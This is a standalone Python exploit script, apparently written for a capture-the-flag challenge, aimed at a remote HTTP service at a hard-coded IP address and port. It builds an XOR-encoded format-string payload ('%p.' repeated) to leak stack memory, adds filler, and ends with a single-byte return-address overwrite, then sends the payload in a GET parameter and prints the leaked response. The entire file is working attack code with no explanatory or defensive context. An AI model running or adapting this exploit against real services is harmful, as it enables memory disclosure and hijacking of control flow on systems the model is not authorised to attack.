#!/usr/bin/env python3
import socket

LHOST = '154.57.164.73'
LPORT = 31136

def send_hex(hex_cmd, hex_key, timeout=15):
    http = f"GET /?cmd={hex_cmd} HTTP/1.1\r\nCMD_KEY: {hex_key}\r\nHost: {LHOST}:{LPORT}\r\nConnection: close\r\n\r\n"
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((LHOST, LPORT))
        s.send(http.encode())
        resp = b''
        while True:
            try:
                d = s.recv(4096)
                if not d: break
                resp += d
            except socket.timeout: break
        s.close()
        return resp
    except Exception as e:
        return b'ERROR:' + str(e).encode()

key = 0x29
# 62 bytes of "%p." repeated
fmt = (b'%p.' * 31)[:62]
print(f"Format len: {len(fmt)}")

pre_xor = bytes(b ^ key for b in fmt)
filler = b'\x41' * 90
ret_overwrite = b'\xa9'
payload = pre_xor + filler + ret_overwrite
print(f"Payload total: {len(payload)} bytes")

hex_payload = payload.hex()
print(f"Hex len: {len(hex_payload)} chars")

resp = send_hex(hex_payload, "29", timeout=15)
body = resp.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in resp else resp
print(f"Response ({len(resp)} bytes): {body[:500]}")
